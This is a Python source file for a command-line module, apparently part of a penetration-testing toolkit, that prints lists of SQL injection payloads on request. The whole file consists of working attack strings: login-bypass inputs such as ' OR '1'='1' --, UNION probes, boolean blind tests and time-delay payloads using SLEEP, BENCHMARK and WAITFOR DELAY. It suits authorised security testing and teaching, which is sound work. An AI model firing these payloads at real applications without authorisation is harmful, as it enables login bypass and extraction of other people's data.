"""SQL injection tester"""

from Commands import Command

class SqliCommand(Command):
    name = "sqli"
    description = "SQL injection payload generator"
    usage = "sqli [type]"
    
    def execute(self, args):
        type_ = args[0] if args else "basic"
        
        payloads = {
            "basic": [
                "' OR '1'='1",
                "' OR '1'='1' --",
                "admin' --",
                "' OR 1=1 --",
                "' UNION SELECT NULL --"
            ],
            "blind": [
                "1' AND '1'='1",
                "1' AND '1'='2",
                "1' AND SLEEP(5) --",
                "1' AND IF(1=1, SLEEP(5), 0) --"
            ],
            "time": [
                "1 AND SLEEP(5)",
                "1' AND BENCHMARK(5000000, MD5('A')) --",
                "1; WAITFOR DELAY '00:00:05' --"
            ]
        }
        
        print(f"\n[*] SQL Injection Payloads ({type_}):")
        
        for payload in payloads.get(type_, payloads["basic"]):
            print(f"[+] {payload}")
